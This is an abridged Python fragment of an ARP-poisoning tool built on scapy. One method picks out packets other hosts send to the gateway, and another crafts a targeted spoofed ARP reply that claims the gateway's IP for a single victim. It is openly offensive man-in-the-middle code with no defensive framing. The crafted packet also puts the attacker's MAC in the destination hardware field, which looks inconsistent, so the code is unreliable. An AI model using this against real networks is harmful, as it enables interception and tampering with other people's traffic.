...
class ArpPoisoner(object):
    ...
    def is_packet_to_original_gateway(self, packet) -> bool:
        ...
        """
        if packet[S.Ether].src != self.our_mac and packet[S.Ether].dst == self.gateway_mac:
            return True
        return False
    ...
    def create_poison(self, victim_packet):
        ...
        2. Don't poison everyone on the network - poison only this specific
           victim.
        """
        # op=2 -> reply to a sender instead of a broadcast
        arp_poison = S.ARP(op=2, hwdst=self.our_mac, pdst=victim_packet[S.IP].src, psrc=self.gateway_ip)
        return arp_poison
